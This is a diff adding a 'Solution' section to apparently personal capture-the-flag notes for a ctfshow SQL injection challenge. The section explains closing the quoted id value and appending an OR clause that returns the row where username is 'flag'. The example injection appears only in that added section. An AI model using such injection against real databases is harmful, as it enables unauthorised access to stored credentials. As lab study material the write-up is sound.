@@ -278,3 +278,12 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 ```SQL
 select id,username,password from ctfshow_user where username !='flag' and id = '???' limit 1;
 ```
+
+## Solution
+- close the `id='`
+	- `id='999'`
+- find the target with `username='flag'`
+```SQL
+select id, username, password from ctfshow_user where username != 'flag' and id = '999' or username = 'flag' limit 1;
+```
+![[Pasted image 20250124090506.png]]
